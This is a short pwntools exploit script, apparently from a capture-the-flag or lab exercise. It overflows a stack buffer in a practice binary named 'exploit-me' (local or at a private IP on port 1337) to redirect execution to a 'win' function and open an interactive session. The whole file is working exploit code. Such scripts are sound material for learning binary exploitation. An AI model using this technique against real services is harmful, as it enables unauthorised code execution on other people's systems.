#!/usr/bin/env python

from pwn import *

context.arch = 'amd64'
#context.log_level = 'DEBUG'

TARGET = './exploit-me'
HOST = '192.168.228.129'
PORT = 1337

elf = ELF(TARGET)
#libc = ELF('./libc.so.6')
#ld = ELF("./ld-2.27.so")

if not args.REMOTE:
  p = process(TARGET)
else:
  p = remote(HOST, PORT)

gdb_script = f"""
    break *main
"""
#gdb.attach(p, gdbscript=gdb_script)

# ===================================== #

offset = b'A' * (0x40 + 8)
win = 0x0000000000401156

payload = flat(
    offset,
    win
)

p.send(payload)

p.interactive()
p.close()

# NOTE:
# Basic Buffer Overflow
